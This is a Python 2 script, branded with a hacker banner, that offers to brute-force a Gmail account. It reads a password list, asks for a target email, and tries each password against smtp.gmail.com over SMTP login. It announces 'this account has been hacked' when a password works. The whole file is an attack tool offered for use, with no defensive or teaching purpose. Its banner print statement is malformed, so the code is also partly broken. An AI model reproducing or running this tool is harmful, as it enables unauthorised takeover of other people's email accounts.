
#!/usr/bin/python 
  
 import smtplib 
 from os import system 
  
 def main(): 
    print '=================================================' 
    print '   coded by REDOUPS                    ' 
    print '   creator by RED OUPS                          ' 
    print '   HACKER : RED OUPS                              ' 
    print '   HACKER : CONSTANTINE                          ' 
    print '   Metaverse:https://www.facebook.com/Red.oupshack  ' 
    print '=================================================' 
    print '               ++++++++++++++++++++              ' 
    print ' ____  _____ ____     ___  _   _ ____  ____
|  _ \| ____|  _ \   / _ \| | | |  _ \/ ___|
| |_) |  _| | | | | | | | | | | | |_) \___ \
|  _ <| |___| |_| | | |_| | |_| |  __/ ___) |
|_| \_\_____|____/   \___/ \___/|_|   |____/

 _____ ____  ___ ____ _  _______ _   _ ____
|_   _|  _ \|_ _/ ___| |/ / ____| | | |  _ \
  | | | |_) || | |   | ' /|  _| | | | | |_) |
  | | |  _ < | | |___| . \| |___| |_| |  _ <
  |_| |_| \_\___\____|_|\_\_____|\___/|_| \_\

    _    _   _  ___  _   ___   ____  __  ___  _   _ ____
   / \  | \ | |/ _ \| \ | \ \ / /  \/  |/ _ \| | | / ___|
  / _ \ |  \| | | | |  \| |\ V /| |\/| | | | | | | \___ \
 / ___ \| |\  | |_| | |\  | | | | |  | | |_| | |_| |___) |
/_/   \_\_| \_|\___/|_| \_| |_| |_|  |_|\___/ \___/|____/
    
 main() 
 print '[1] start the brute force attack' 
 print '[2] exit' 
 option = input('==>') 
 if option == 1: 
    file_path = raw_input('enter the path of passwords file :') 
 else: 
    system('clear') 
    exit() 
 pass_file = open(file_path,'r') 
 pass_list = pass_file.readlines() 
 def login(): 
     i = 0 
     user_name = raw_input('enter the target email :') 
     server = smtplib.SMTP_SSL('smtp.gmail.com', 465) 
     server.ehlo() 
     for password in pass_list: 
       i = i + 1 
       print str(i) + '/' + str(len(pass_list)) 
       try: 
          server.login(user_name, password) 
          system('clear') 
          main() 
          print '\n' 
          print '[+] this account has been hacked, password :' + password + '     ^_^' 
          break 
       except smtplib.SMTPAuthenticationError as e: 
          error = str(e) 
          if error[14] == '<': 
             system('clear') 
             main() 
             print '[+] this account has been hacked, password :' + password + '     ^_^' 
  
             break 
          else: 
             print '[!] password not found => ' + password 
 login()